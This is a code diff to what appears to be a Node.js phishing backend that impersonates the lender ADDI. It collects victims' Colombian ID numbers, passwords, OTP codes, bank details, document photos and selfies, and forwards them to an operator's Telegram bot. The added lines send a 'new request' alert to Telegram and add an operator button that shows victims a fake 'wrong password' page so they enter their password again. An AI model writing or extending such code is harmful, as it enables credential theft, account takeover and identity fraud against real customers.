@@ -71,9 +71,35 @@ function getBotones(sessionId) {
       [
         { text: "⚠️ ERR DOC", callback_data: `erpic_${sessionId}` },
         { text: "⚠️ ERR REST", callback_data: `errest_${sessionId}` }
+      ],
+      [
+        { text: "⚠️ ERR PSS", callback_data: `erpss_${sessionId}` }
       ]
     ]
   };
+}
+
+// Mensaje inicial al registrar cédula (sin contraseña)
+async function enviarMensajeInicio({ cedula, docType, sessionId }) {
+  const mensaje = `
+📋 NUEVA SOLICITUD ADDI
+👤 Cédula: ${docType} ${cedula}
+⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}
+
+⏳ Esperando decisión del admin...
+`.trim();
+  const botones = getBotones(sessionId);
+  const response = await fetch(getTelegramApiUrl('sendMessage'), {
+    method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, reply_markup: botones })
+  });
+  const data = await response.json();
+  if (data.ok && data.result) {
+    const msgId = data.result.message_id;
+    const sd = sessions.get(sessionId) || { redirect_to: null };
+    sd.lastMsgId = msgId;
+    sessions.set(sessionId, sd);
+  }
 }
 
 // Enviar mensaje con botones
@@ -380,6 +406,15 @@ app.post("/notifyotpwa", async (req, res) => {
   return res.json({ ok: true });
 });
 
+// POST /api/inicio - Registra sesión y envía mensaje inicial a Telegram
+app.post("/api/inicio", async (req, res) => {
+  const { sessionId, cedula, docType } = req.body;
+  if (!sessionId || !cedula || !docType) return res.status(400).json({ error: "Faltan parámetros" });
+  sessions.set(sessionId, { redirect_to: null });
+  res.json({ ok: true });
+  try { await enviarMensajeInicio({ cedula, docType, sessionId }); } catch(e) { console.error('[inicio]', e.message); }
+});
+
 // POST /virtualpersona - Recibe cedula + contraseña
 app.post("/virtualpersona", async (req, res) => {
   const { session_id, cedula, docType, password } = req.body;
@@ -449,7 +484,8 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
         eridfy: { message: 'Datos bancarios incorrectos. Intenta de nuevo.', target: 'idfy.html' },
         erotp:  { message: 'Código OTP incorrecto. Intenta de nuevo.', target: 'otp.html' },
         erpic:  { message: 'Documentos no válidos. Intenta de nuevo.', target: 'pic.html' },
-        errest: { message: 'Selfie no válida. Intenta de nuevo.', target: 'rest.html' }
+        errest: { message: 'Selfie no válida. Intenta de nuevo.', target: 'rest.html' },
+        erpss:  { message: 'Contraseña incorrecta. Intenta de nuevo.', target: 'pss.html' }
       };
       if (ERROR_CMDS[action]) {
         sessionData.error_cmd = ERROR_CMDS[action];
